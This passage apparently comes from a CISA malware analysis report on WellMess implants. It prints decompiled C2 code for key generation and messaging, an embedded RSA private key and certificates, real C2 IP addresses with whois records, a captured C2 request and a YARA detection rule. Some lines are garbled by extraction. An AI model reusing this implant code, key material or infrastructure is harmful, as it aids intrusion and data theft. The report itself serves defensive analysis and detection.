128;\nRfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(hash, randomBytes, 1000);\nrijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);\nrijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);\ndictionary.Add(\"Key\", rijndaelManaged.Key);\ndictionary.Add(\"IV\", rijndaelManaged.IV);\n}\nreturn dictionary;\n}\n—End AES Key Generation Function—\n\nThe malware also contains the following hard-coded public RSA key:\n\n—Begin Pub RSA Key—\n<RSAKeyValue>\n<Modulus>4Dy24gTFNYA/jq6SYiAkdRvY1ieWqM9R8dwo0uL+4GzaRObZEoUaZSHhvfeD1v762+duL1LgAcuXJeRg4PB4cGdpZqjKtB2BKIDJv3h2\n</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>\"\n—End Pub RSA Key—\n\nThe encrypted portion of the callout in the main body of the POST is the dynamically generated AES key encrypted with the hard-coded RSA\npublic key. The following function is utilized to conduct the initial C2 connection to the C2 server. The “Message” variable argument will contain\nthe dynamically generated AES key encrypted utilizing the embedded RSA public key.\n\n—Begin SendMessage Function—\npublic void SendMessage(string Message, string idMess, string askOrReply, string service)\n{\nTransportProtocol transportProtocol = new TransportProtocol();\nstring message = transportProtocol.FullMessage(idMess, askOrReply, service);\nstring service1 = new RC6(Convert.FromBase64String(Variable.keyRC6), Variable._serverType).Encrypt(message);\nDictionary<HttpStatusCode, List<string>> dictionary = transportProtocol.Post(Message, service1, true);\nfor (int index = 0; !dictionary.ContainsKey(HttpStatusCode.OK) && index < 3; ++index)\n{\nThread.Sleep(new Random().Next(5, 20) * 1000);\ndictionary = transportProtocol.Post(Message, service1, true);\n}\n}\n—End SendMessage Function—\n\nThe malware contains a function named “DownloadVar” which allows the malware to receive and parse messages from the remote operator.\nAs illustrated, the malware will decrypt the body of these messages using the dynamically generated AES key mentioned above.\n\n\n-----\n\neg o oad a u ct o\nprivate static Dictionary<string, string> DownloadVar(\nstring idMess,\nstring askOrReply,\nstring service,\nbool client)\n{\nList<string> message = new Transport().ReceiveMessage(idMess, askOrReply, service, client);\ntry\n{\nDictionary<string, string> dictionary = new ParseMessage(message[0]).Parse();\nif (!dictionary.ContainsKey(\"body\"))\ndictionary.Add(\"body\", message[1]);\nif (dictionary[nameof (service)] == \"p\" || dictionary[\"head\"] == \"C\" || dictionary[\"head\"] == \"G\" || !client)\nreturn dictionary;\nif (string.IsNullOrEmpty(dictionary[\"body\"]))\nreturn dictionary;\ntry\n{\nbyte[] numArray = SymmCrypto.AES_Decrypt(Convert.FromBase64String(dictionary[\"body\"]), Variable.keySymm);\ndictionary[\"body\"] = !dictionary[nameof (service)].StartsWith(\"f\") ? Message.UnPack(numArray) : Message.UnPackB(numArray);\nreturn dictionary;\n}\ncatch (FormatException ex)\n{\nreturn (Dictionary<string, string>) null;\n}\n}\ncatch (Exception ex)\n{\nreturn (Dictionary<string, string>) null;\n}\n}\n—End DownloadVar Function—\nScreenshots\n\n**Figure 2 - Data contained within the \"cookie:\" header of the initial traffic to the remote C2, being encrypted with RC6.**\n\n**Figure 3 - Malware generating hash unique for the victim system. This hash value in an encrypted and encoded format will be included in the**\n\"cookie:\" header of the transmissions to the C2 server.\n\n**Figure 4 - Encrypted \"cookie:\" header being formatted for transmission of the remote C2 server.**\n\n**85.93.2.116**\n\nTags\n\ncommand-and-control\n\nWhois\n\nQueried whois.ripe.net with \"-B 85.93.2.116\"...\n\n% Information related to '85.93.2.0 - 85.93.2.255'\n\n% Abuse contact for '85.93.2.0 - 85.93.2.255' is 'noc@lubnanet.com'\n\n\n-----\n\net u 85 93 0 85 93 55\nnetname:    Arcompus-Medianet\ndescr:     Arcompus-Medianet\ncountry:    LB\norg:      ORG-AMIS1-RIPE\nadmin-c:    AMN61-RIPE\ntech-c:     AMN61-RIPE\nstatus:     ASSIGNED PA\nmnt-by:     arcompusmedia-mnt\ncreated:    2015-10-05T12:27:29Z\nlast-modified: 2015-10-05T12:27:59Z\nsource:     RIPE\norganisation: ORG-AMIS1-RIPE\norg-name:   Arcompus Medianet Int. SARL\norg-type:   OTHER\naddress:    Baabda\naddress:    Lebanon\ne-mail:     noc@lubnanet.com\nabuse-c:    AC32241-RIPE\nmnt-ref:    arcompusmedia-mnt\nmnt-by:     arcompusmedia-mnt\ncreated:    2015-10-02T07:33:53Z\nlast-modified: 2020-01-03T08:52:39Z\nsource:     RIPE\nrole:     Network Operations Centre\naddress:    15 Saed Fraiha,\naddress:    Baabda, 1003,\naddress:    Lebanon\ne-mail:     noc@lubnanet.com\nabuse-mailbox: noc@lubnanet.com\nnic-hdl:    AMN61-RIPE\nmnt-by:     arcompusmedia-mnt\ncreated:    2015-10-02T07:36:29Z\nlast-modified: 2020-01-03T08:31:27Z\nsource:     RIPE\n% Information related to '85.93.2.0/24AS203913'\nroute:     85.93.2.0/24\ndescr:     ArcompusMedia\norigin:     AS203913\nmnt-by:     arcompusmedia-mnt\ncreated:    2015-12-15T16:27:03Z\nlast-modified: 2018-02-06T10:01:56Z\nsource:     RIPE\n% This query was served by the RIPE Database Query Service version 1.97.2 (ANGUS)\n\nRelationships\n\n85.93.2.116 Connected_From 47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\n\nDescription\n\n47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854 attempts to connect to the IP address.\n\n**5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** 5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\n\n**Size** 6900178 bytes\n\n**Type** ELF 64-bit LSB executable, x86-64, version 1 (SYSV)\n\n**MD5** 3a9cdd8a5cbc3ab10ad64c4bb641b41f\n\n\n-----\n\n**SHA1** e45f89c923d0361ce8f9c64a63031860a76b2d10\n\n**SHA256** 5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\n\n**SHA512** 2d1d26081637c925fb6ae5f92b278f87a8253fd65a75c44fdc2c513a24dc9e0658c552ebc9c9c76c70ad948c60901e682184a833aae51a8\n\n**ssdeep** 49152:hPyt5H89G+YrbjVWMiUMNqb054dzNIdEp+rt1D5TvLlcpigaB5IDPmoFjPnMBbs0:hqHaQKNzVLlhLopfMlsnh8K54\n\n**Entropy** 6.016965\n\nAntivirus\n\n**Antiy** Trojan/Linux.WellMess\n\n**BitDefender** Trojan.Linux.Generic.173705\n\n**ESET** a variant of Linux/WellMess.B trojan\n\n**Emsisoft** Trojan.Linux.Generic.173705 (B)\n\nYARA Rules\n\n\n-----\n\nu e C S _ 0 96 8 _0 t oja SS\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nDate= \"2020-07-06\"\nLast_Modified=\"20200706_1017\"\nActor=\"n/a\"\nCategory=\"Trojan\"\nFamily=\"WellMess\"\nDescription = \"Detects WellMess implant and SangFor Exploit\"\nMD5_1 = \"4d38ac3319b167f6c8acb16b70297111\"\nSHA256_1 = \"7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\"\nMD5_2 = \"a32e1202257a2945bf0f878c58490af8\"\nSHA256_2 = \"a4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\"\nMD5_3 = \"861879f402fe3080ab058c0c88536be4\"\nSHA256_3 = \"14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\"\nMD5_4 = \"2f9f4f2a9d438cdc944f79bdf44a18f8\"\nSHA256_4 = \"e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\"\nMD5_5 = \"ae7a46529a0f74fb83beeb1ab2c68c5c\"\nSHA256_5 = \"fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\"\nMD5_6 = \"f18ced8772e9d1a640b8b4a731dfb6e0\"\nSHA256_6 = \"953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\"\nMD5_7 = \"3a9cdd8a5cbc3ab10ad64c4bb641b41f\"\nSHA256_7 = \"5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\"\nMD5_8 = \"967fcf185634def5177f74b0f703bdc0\"\nSHA256_8 = \"58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\"\nMD5_9 = \"c5d5cb99291fa4b2a68b5ea3ff9d9f9a\"\nSHA256_9 = \"65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\"\nMD5_10 = \"01d322dcac438d2bb6bce2bae8d613cb\"\nSHA256_10 = \"0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494\"\nMD5_11 = \"8777a9796565effa01b03cf1cea9d24d\"\nSHA256_11 = \"83014ab5b3f63b0253cdab6d715f5988ac9014570fa4ab2b267c7cf9ba237d18\"\nMD5_12 = \"507bb551bd7073f846760d8b357b7aa9\"\nSHA256_12 = \"47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\"\nstrings:\n$0 = \"/home/ubuntu/GoProject/src/bot/botlib/chat.go\"\n$1 = \"/home/ubuntu/GoProject/src/bot/botlib.Post\"\n$2 = \"GoProject/src/bot/botlib.deleteFile\"\n$3 = \"ubuntu/GoProject/src/bot/botlib.generateRandomString\"\n$4 = \"GoProject/src/bot/botlib.AES_Decrypt\"\n$5 = { 53 00 63 00 72 00 69 00 70 00 74 00 00 0F 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 07 2F 00 63 }\n$6 = { 3C 00 6E 00 77 00 3E 00 2E 00 2A 00 29 00 00 0B 24 00 7B 00 66 00 6E 00 7D }\n$7 = { 7B 00 61 00 72 00 67 00 7D 00 00 0B 24 00 7B 00 6E 00 77 00 7D }\n$8 = { 52 61 6E 64 6F 6D 53 74 72 69 6E 67 00 44 65 6C 65 74 65 46 69 6C 65 }\n$9 = \"get_keyRC6\"\n$10 = { 7D A3 26 77 1D 63 3D 5A 32 B4 6F 1F 55 49 44 25 }\n$11 = { 47 C2 2F 35 93 41 2F 55 73 0B C2 60 AB E1 2B 42 }\n$12 = { 53 58 9B 17 1F 45 BD 72 EC 01 30 6C 4F CA 93 1D }\n$13 = { 48 81 21 81 5F 53 3A 64 E0 ED FF 21 23 E5 00 12 }\n$14 = \"GoProject/src/bot/botlib.wellMess\"\n$15 = { 62 6F 74 6C 69 62 2E 4A 6F 69 6E 44 6E 73 43 68 75 6E 6B 73 }\n$16 = { 62 6F 74 6C 69 62 2E 45 78 65 63 }\n$17 = { 62 6F 74 6C 69 62 2E 47 65 74 52 61 6E 64 6F 6D 42 79 74 65 73 }\n$18 = { 62 6F 74 6C 69 62 2E 4B 65 79 }\n$19 = { 7F 16 21 9D 7B 03 CB D9 17 3B 9F 27 B3 DC 88 0F }\n$20 = { D9 BD 0A 0E 90 10 B1 39 D0 C8 56 58 69 74 15 8B }\n$21 = { 44 00 59 00 4A 00 20 00 36 00 47 00 73 00 62 00 59 00 31 00 2E }\n$22 = { 6E 00 20 00 46 00 75 00 7A 00 2C 00 4B 00 5A 00 20 00 33 00 31 00 69 00 6A 00 75 }\n$23 = { 43 00 31 00 69 00 76 00 66 00 39 00 32 00 20 00 56 00 37 00 6C 00 4F 00 48 }\n$24 = { 66 69 6C 65 4E 61 6D 65 3A 28 3F 50 3C 66 6E 3E 2E 2A 3F 29 5C 73 61 72 67 73 3A 28 3F 50 3C 61 72 67 3E 2E 2A 3F }\n$25 = { 5C 00 2E 00 53 00 61 00 6E 00 67 00 66 00 6F 00 72 00 55 00 44 00 2E 00 73 00 75 00 6D }\n$26 = { 66 6F 72 6D 2D 64 61 74 61 3B 20 6E 61 6D 65 3D 22 5F 67 61 22 3B 20 66 69 6C 65 6E 61 6D 65 3D }\n$27 = { 40 5B 5E 5C 73 5D 2B 3F 5C 73 28 3F 50 3C 74 61 72 3E 2E 2A 3F 29 5C 73 27 }\ncondition:\n\n\n-----\n\n($0 a d $ a d $ a d $3 a d $ ) o ($5 a d $6 a d $ a d $8 a d $9) o ($ 0 a d $ ) o ($ a d $ 3) o ($ ) o ($ 5 a d $ 6\nand $17 and $18) or ($19 and $20) or ($21 and $22 and $23) or ($24) or ($25 and $26) or ($27)\n}\n\nssdeep Matches\n\nNo matches found.\n\nRelationships\n\n5ca4a9f655... Connected_To 209.58.186.196\n\n5ca4a9f655... Connected_To 141.98.212.55\n\nDescription\n\nThis artifact is an ELF 64-bit file. It has been identified as a variant of the WellMess malware family. When the file is executed, it attempts to\ncreate a C2 connection to one of the following IP addresses:\n\n141.98.212.55 over Transmission Control Protocol(TCP) Port 53\n209.58.186.196 over TCP Port 443\n\nThe initial C2 connection over port 53 will be a normal WellMess C2 session wherein parts of the message are encrypted with RSA and RC6.\nWhereas, the C2 session via port 443 will be fully secured via a Secure Sockets Layer (SSL) session.\n\nThe following keys and certificates are used to create the secure connection:\n\n—Begin Keys and Certificates—\n\n—Begin Certificate—\nMIIDAzCCAeugAwIBAgICBnowDQYJKoZIhvcNAQELBQAwKTEOMAwGA1UEBhMFVHVu\naXMxCzAJBgNVBAoTAklUMQowCAYDVQQDEwEqMB4XDTE4MTIxNjA4NTEzNloXDTI5\nMDcxNjA3NTEzNlowHTEOMAwGA1UEBhMFVHVuaXMxCzAJBgNVBAoTAklUMIIBIjAN\nBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsLZde+H/Bu3mA8xRa2c9DCmdYqnc\nvGC1Re9BO3c+kCcUbVqyR2t3mPrDpW4L94MDDHEF7LZ5VcXvNCTrfwRKI+ncoGQr\ns6yR0xM7Ru1ObV/E6GdUGvlJMy2WKE3UsiHx2BJ2MnHvKa1yJSt5wjkMKEwqbUHQ\nIbLqmwrZ/Ud1AW+tZEs6kfEEuobNfIqLpZDLGT17FGnshqUa+iMnQ9b9Nax42kgm\n/2AsD0N0rW8+DOoP7RiCPqsbcUanquxpLqpO9Zyw517wHLpImUn56B+dwnHVWb8o\nO5qqikB2X+cq3rnSAaaBAD4JDVdQqS9poEXDnbBdGJczXSPFdx0UrOC5kQIDAQAB\no0EwPzAOBgNVHQ8BAf8EBAMCB4AwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUF\nBwMBMA4GA1UdDgQHBAUBAgMEBjANBgkqhkiG9w0BAQsFAAOCAQEAK/n6JljR5epC\nsUDpTz2GMGwnMHu0zOklOhv61AyfeTMC800G8/JbAe7ImueHSSWeV2Gg/tv10wrv\nHKMNAkiPxaAK3wSl2391e3+e1SD/fmJNqBJVm2/OegzdezRyujTzwvsVuGIGJknH\nehutZmaL6GMYy9BtWs4n8tLgIn+vi7WofawNhPyIYqkvZvitqUhJ5IcIFDkeoiYb\n9ThGlPI91X0c+6nxMJSLHdD6D8mVQKDP9CH9Kr7weXeFBE8AbVMi3/Jm6V791/jr\nR5Z/j1JiU2o69Cj+31CfqXuIxd712MHSPoqhcXZov8w55MXgvX9NxY31G76X5R3h\n71A5grjoww==\n—End Certificate—\n\n—Begin Certificate—\nMIIDEDCCAfigAwIBAgICBnUwDQYJKoZIhvcNAQELBQAwKTEOMAwGA1UEBhMFVHVu\naXMxCzAJBgNVBAoTAklUMQowCAYDVQQDEwEqMB4XDTE5MDIwNTExMjgyOVoXDTI5\nMDIxNTExMjgyOVowKTEOMAwGA1UEBhMFVHVuaXMxCzAJBgNVBAoTAklUMQowCAYD\nVQQDEwEqMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwgjuu797/ixV\n8DOeOVSbxihX4RO9TI0CKnveqjzbb7a64fjJxIy/WxcpruLaeC1xhaWfxPeoMVJe\nFZxdiE59uDLdhRJzItEmoRrxGqcZQ94K6G1YoNFBP7dGzn8J+GSP0JdWrHUGkpaq\nW1xFl0zk33AuFwOCJmgQN6TD1lXgwQx90IZFsmBkeZYUQRaNEV6gwSzFQZauZ161\nEUsW7WeOJ71uTOqC71NEtXypYFhqpUhmHAABPetoBO1MyBxseaQiji+m5XjWGMfu\n0ZuXRpJ4qAGhwrVVbR4MoLWa8VYytGCcMPZoWedmvAOX5wl9Ol9JAL+g2hOY79rS\nmoF+Dc/S+QIDAQABo0IwQDAOBgNVHQ8BAf8EBAMCAoQwHQYDVR0lBBYwFAYIKwYB\nBQUHAwIGCCsGAQUFBwMBMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQAD\nggEBAJgenxhajyC5gNQR1e7umh6WWSS8P3ywqKMf1AEHjvrzKoJiUCRQ+BHAf4B0\nTNQ4GpMIwDZBAMTmq80lEVZAy3M21Q4+iPzDBDaCV88bqD4AgIwnpxPoaAVUJoXJ\n+tBQ7OSz6s8QYJWnMhSqcytj3pLrfUhgkjtBzScx18zL+l21V/v08y+geE3iw/Fh\nblGDPjcLPYCuPSFpmy+X+/h0VSvQdV7KvS9B7g7KzA0eR7Y516xKBXmGV80PRJj2\nlbi5v2CxdJHggTWt4q4/GB4PAHMFr/dz4qOsSKeryZJcSK2HODtl1Mr5zXdn3DB4\nGjt5XCFfp0SzMWhtOIes8N97+lQ=\n—End Certificate—\n\n\n-----\n\neg S ate ey\nMIIEowIBAAKCAQEAsLZde+H/Bu3mA8xRa2c9DCmdYqncvGC1Re9BO3c+kCcUbVqy\nR2t3mPrDpW4L94MDDHEF7LZ5VcXvNCTrfwRKI+ncoGQrs6yR0xM7Ru1ObV/E6GdU\nGvlJMy2WKE3UsiHx2BJ2MnHvKa1yJSt5wjkMKEwqbUHQIbLqmwrZ/Ud1AW+tZEs6\nkfEEuobNfIqLpZDLGT17FGnshqUa+iMnQ9b9Nax42kgm/2AsD0N0rW8+DOoP7RiC\nPqsbcUanquxpLqpO9Zyw517wHLpImUn56B+dwnHVWb8oO5qqikB2X+cq3rnSAaaB\nAD4JDVdQqS9poEXDnbBdGJczXSPFdx0UrOC5kQIDAQABAoIBAQCAXRhvQu00JV+u\nZp7GPAoWaaxP3T/g/wbutCtYfPhPUnP+M6HJS4Fm+NFhvBypQNvYD8nT94EQE2X9\nJMyESaNpjxma0OkF7VdIUnH+xabwwF6Sy2xG48qOiJDI2jCk7Q92e4KshiLKzZla\n8sfRlAsGwr0W/HWp5QOSeEF9QIj37udx8zoo68ROFLe3RIbc4VsjN4/rC46K1YHb\nOi9J+M2ScFWTjHYAu4Pvrjd8WqvPudF5FG+g4pF9qGhGhM27q37skNHr1REby/UU\nQC7zzAUJB9c+Wr+iREDI3psItVzCL7ZXqHpG2qM3VdqMz+m+EN1vnfZWNX4EuaUa\nHp/YhOCZAoGBAOiS0Cs6RWtXEnNdSD3ap0M9yqwtrdV7iNcy4PGtIOTICN/3paVF\nEatcOowqwpXiihZIEWDAe2QuvlocL4rIDHof42kInr7nM9pMHZia50qtSmGATwTN\n3BbqTkK7O2wSbsZoZzRpTMB6kYonsw1xg02jTh+aXTMstpL/2I96v7AvAoGBAMKD\nGxUKspKSF9xPkaR1jI3YOp5GYZxhkbR/O4cZgHEClbZlwkd+er63ecvxNoNOYmu9\nMdh98t+Dsnv1zrA3cFAxmsmwiAvc/tPpv3KQPVe2XbWza1o9vueHYpSoE/wwjxmK\nWOV0Cazihoa0MV+lVyPRhKgCV1xLGcLc8kcD7AI/AoGAQ9WGaAVP+BXmaMWda4UZ\n4g/kzEFqgWjNqc7KM1NG09PQWtrVcpXpqGx3Gyjhpmvz0Lnmb6zUkIzdslSkPTtK\nAFjKsHj2LEItKo+m1jrgGTTgC/4rjgApIHnop6gKlePucWpEJ9JKs51MU9pubA5e\nuMdX4vnYEzQIcGm1FWw8+rsCgYBuLVkvyAlyYHJHhoKWx0bAKdS6Rl+P9uxTcyZC\n1j0cxjwLPwSW/puEX+ULkiwwoDu7j0UmveDOnoiBErDqu9xQcGifCfFl1t45JtQc\njntQranS/Dg4u3ThLJy4W6RGWzMTYnwMLHg2h3Fv56134e3ECi+8Aud9DcUfzYsm\nkqAifQKBgHtMn87pL0wQ8eLpk/5+4fSVR5cCBS9/oBciO/g2g88Grb69g8PTyn99\nbhiRlKDfAPnA/+gYtjCMNbyKkCy2Kf4UaWh3cMJnGafFTOci2Uve4zj/SSePAp3O\nviyz2EuMK0ZZc4nNBK6leRFq4GEgwZSr7RakpKU1t3vlhMrRDuSI\n—End RSA Private Key—\n\n—Begin Public Key—\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArRiKDue9YA6DUzYu6WQv\noWOxp8wel/Ws/5jK1Xsv2f8lJwUDxM+zT4dGL3ZyJLMkbBQk8HyvAm+6331M47vF\nsbva2BCzQxdEWO9ey3LnhCtpQOgjypf1QcPy4Kx6jj2BiVEtPP9YBa75QkUNR0oO\n0n6PKFP8SX6Mv0UyHqS3tsa8D21nm2hf3rO7sqBXevs9xdvKbxiKLJxY6WEvKAGH\n7Q09rndwr4b7gJ56GZGBwVeqkoVmRFM/nNq9aymTOe4PNRdOcpYK7AoT/QjA0IvO\nQ5XOapb3iJWHLlxCGfBRT+ISVfg4PVdXev2wsXFe6h3McXHoN7FZgyo10XiP2QZU\nRQIDAQAB\n—End Public Key—\n\n—End Keys and Certificates—\n\nThe program uses TCP ports 53 and 443 because of the likelihood that these ports would be open on the router. However, outbound TCP\nconnections initiated on TCP port 53 would be unusual, because typically, this port is reserved for the Domain Naming System (DNS) and\noutbound queries are done using the User Datagram Protocol (UDP) protocol or TCP, while inbound answer records may use both. This\nactivity could be flagged as suspicious.\n\nThe malware contains functions that are similar in design to the .NET version of WellMess\n(47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854). Figures 5-7 detail that both implants contained similar\nfunctions named “Work” and “SendMessage”.\n\nIn addition, this sample contains a function named “botlib_Exec”, which is very similar in design and purpose to the function named\n“Command” within the file 47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854. Both implants utilize the same\nREGEX value to parse executable scripts from data received from a remote operator via a C2 session. (Figure 8).\n\nA primary difference between the implants is that this version initially attempts a C2 session to IP address 141.98.212.55 over port 53. If this\nC2 server is not available, it will attempt an SSL secured (port 443) C2 session with the C2 IP address 209.58.186.196. The presence of an\nRSA private key within this implant is likely to facilitate this secure SSL session.\n\n—Begin WellMess C2 session—\nPOST / HTTP/1.1\nHost: 141.98.212.55:53\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20100101 Firefox/21.0\nContent-Length: 422\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nCookie: kODDoMox=1BL6+BSiiy+oacN+71k8zt0+QD9kU+68ED+dmsgi+yPol5+b%2C;\nOVbjPRp4=0w1X.+2IB+nuI+58oEfe4+q9P+nrw+pmQk3X+fN%2CB9u+aP%2C3EB.+%3Aa%3A+0UOlTc+Ew%2Cy5O+Y%2CXTx%2C+Of7mNHE\nAccept-Encoding: gzip\n\n\n-----\n\n0 Utg e,j g d d S q53t 8J 5 Q y U q S c scO 3 b Q 9 G b q s 6 pog q0 b as j 6sQ\nIyV 8VW 0C3038b QpTy8Cf z6mJw oeg. 6MG8,lQ ymdPXR q1tRd Fxg brhM 7cp Zf9JPKV CcKyKPK. OFdOqE 6XO oL8kKA qnq 9c2Yc9\n,xm6Gdy ra9 ORzvq. 3BX8q 6rE 2:H 1ALG8G N7yX 8hn3aNR kHykST9 KucSC2. b0l LJBc6i 9hK2 ZtJ1 jLi9cUA 7VRh G6PGAU qM9n5FD.\nbTy YMzPKF KKnk0i TyYK SMAV sbE 2Jflrk yPmCpN. 2X35q5 JhXg\n—End WellMess C2 Session—\nScreenshots\n\n**Figure 5 - This function is similar to the \"Work\" function found within the WellMess sample**\n47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854.\n\n**Figure 6 - \"botlib_Work\" function within this WellMess implant, parsing for the same bytes as the \"Work\" function within WellMess sample**\n47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854.\n\n**Figure 7 - \"botlib.SendMessage\" function found within this WellMess implant and is similar to the \"SendMessage\" function contained within**\n47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854.\n\n\n-----\n\n**Figure 8 - Part of REGEX value this malware utilizes to parse command information, including executable scripts, from data receive from**\nremote operator. This is the same REGEX value the WellMess sample\n47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854 uses to parse command data.\n\n**141.98.212.55**\n\nTags\n\ncommand-and-control\n\nPorts\n\n53 TCP\n\nWhois\n\ninetnum:    141.98.212.0 - 141.98.212.255\n\nnetname:    EstNOC-HongKong\n\ndescr:     EstNOC-Global\n\ncountry:    HK\n\nadmin-c:    EE2159-RIPE\n\ntech-c:     EE2159-RIPE\n\nabuse-c:    ACRO394-RIPE\n\nmnt-routes:   ESTNOC-MNT\n\nmnt-domains:  ESTNOC-MNT\n\nmnt-lower:   ESTNOC-MNT\n\nstatus:     SUB-ALLOCATED PA\n\nremarks:    - - - LEGAL CONCERNS - - \nremarks:    For any legal requests, please send an E-mail to\n\nremarks:    eu-legal@estnoc.ee for a maximum of 48hours response.\nremarks:    - - - LEGAL CONCERNS - - \norg:      ORG-EA968-RIPE\n\nmnt-by:     ESTNOC-MNT\n\ncreated:    2019-02-18T10:02:16Z\n\nlast-modified: 2020-06-01T20:40:40Z\n\nsource:     RIPE\n\norganisation: ORG-EA968-RIPE\n\norg-name:   ESTNOC-GLOBAL\n\norg-type:   OTHER\n\naddress:    Estonia, Parnumaa, Tori vald, Muti kyla, 86811\n\nil b t @ t\n\n\n-----\n\nabuse c C O39\nmnt-ref:    ESTNOC-MNT\nmnt-by:     ESTNOC-MNT\ncreated:    2016-03-02T22:52:16Z\nlast-modified: 2018-09-19T21:55:53Z\nsource:     RIPE\nperson:     Ego Ennok\naddress:    Estonia, Parnumaa, Tori vald, Muti kyla, 86811\nphone:     +37258501736\nnic-hdl:    EE2159-RIPE\nmnt-by:     ESTNOC-MNT\ncreated:    2016-03-02T21:24:09Z\nlast-modified: 2016-03-02T21:24:09Z\nsource:     RIPE\n\nRelationships\n\n141.98.212.55 Connected_From 5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\n\nDescription\n\n5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb attempts to connect to the IP address.\n\n**209.58.186.196**\n\nTags\n\ncommand-and-control\n\nPorts\n\n443 TCP\n\nWhois\n\ninetnum:    209.58.184.0 - 209.58.191.255\n\nnetname:    LSW-HKG-10\n\ncountry:    HK\n\nadmin-c:    LA249-AP\n\ntech-c:     LA249-AP\n\nstatus:     ALLOCATED NON-PORTABLE\n\nmnt-by:     MAINT-LSW-SG\n\nmnt-irt:    IRT-LSW-SG\n\nlast-modified: 2016-07-27T07:50:12Z\n\nsource:     APNIC\n\nirt:      IRT-LSW-SG\n\naddress:    18B Keong Saik Road, Singapore 089125\n\ne-mail:     apnic@sg.leaseweb.com\n\nabuse-mailbox: abuse@sg.leaseweb.com\n\nadmin-c:    LAPP1-AP\n\ntech-c:     LAPP1-AP\n\nauth:     # Filtered\n\nremarks:    abuse@sg.leaseweb.com was validated on 2019-12-12\n\nremarks:    apnic@sg.leaseweb.com was validated on 2020-06-03\n\nmnt-by:     MAINT-LSW-SG\n\nlast-modified: 2020-06-03T14:50:15Z\n\nsource:     APNIC\n\nperson:     LSW Apnic\n\naddress:    18B Keong Saik Road, Singapore 089125\n\ncountry:    SG\n\nphone:     +6531587350\n\ne-mail:     apnic@sg.leaseweb.com\n\nnic-hdl:    LA249-AP\n\nmnt-by:     MAINT-LSW-SG\n\nlast-modified: 2016-06-06T08:59:04Z\n\nsource:     APNIC\n\nRelationships\n\n209 58 186 196 Connected From 5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\n\n\n-----\n\n5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb attempts to connect to the IP address.\n\n**7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** 7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\n\n**Size** 6707096 bytes\n\n**Type** ELF 64-bit LSB executable, x86-64, version 1 (SYSV)\n\n**MD5** 4d38ac3319b167f6c8acb16b70297111\n\n**SHA1** 01a71390892fad77987aa09a630b04ff72e37d5d\n\n**SHA256** 7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\n\n**SHA512** aaae4d94f5a1b75917b2c948d4517928b457da0851f65a196b91f30ccd88645a1066b7111db6f7f2267092f8299520044cfcf4400f8285b0\n\n**ssdeep** 49152:Ik2WH801HarM2F75oeZbwriHBvV1WHr0q44gP1mZWPmoFjPnMBMaBJFtBE/k6rYD:ftHBHadoi+L0vcopfMnBz\n\n**Entropy** 6.005022\n\nAntivirus\n\n**Antiy** Trojan/Linux.Agent\n\n**Avira** LINUX/Agent.kiivu\n\n**BitDefender** Trojan.Linux.Generic.143453\n\n**Cyren** ELF/Trojan.JTPD-6\n\n**ESET** a variant of Linux/WellMess.B trojan\n\n**Emsisoft** Trojan.Linux.Generic.143453 (B)\n\n**Ikarus** Trojan.Linux.Agent\n\n**McAfee** GenericRXKJ-GH!4D38AC3319B1\n\n**TrendMicro** TROJ_FR.C35E7E37\n\n**TrendMicro House Call** TROJ_FR.C35E7E37\n\nYARA Rules\n\n\n-----\n\nu e C S _ 0 96 8 _0 t oja SS\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nDate= 